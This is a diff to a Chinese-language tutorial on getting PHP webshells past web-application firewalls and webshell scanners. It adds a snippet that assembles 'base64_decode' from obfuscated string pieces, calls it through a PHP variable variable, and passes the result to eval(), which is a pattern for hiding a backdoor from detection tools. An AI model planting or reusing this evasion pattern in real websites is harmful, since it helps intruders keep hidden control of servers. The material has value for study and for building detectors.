@@ -61,6 +61,23 @@ D盾_Web查杀
 网站安全狗网马查杀  
 ![10](https://ws1.sinaimg.cn/large/006VEsyOgy1g0r384ykhrj30p006ngly.jpg)
 
+至此绕过以上4个WAF查杀，但是上面那个例子虽然成功绕过了，但是看起来很简单，所以在写一个。  
+首先我们来了解php中`$$`一个引用变量。  
+
+```php
+
+```
+
+```php
+<?php
+$a = 'bAsE';
+$b = '64_dEcODE';
+$fuck = $a.$b;
+$d = "fuck";
+$e = $$d('');  //$$
+eval($e); 
+```
+
 
 
 
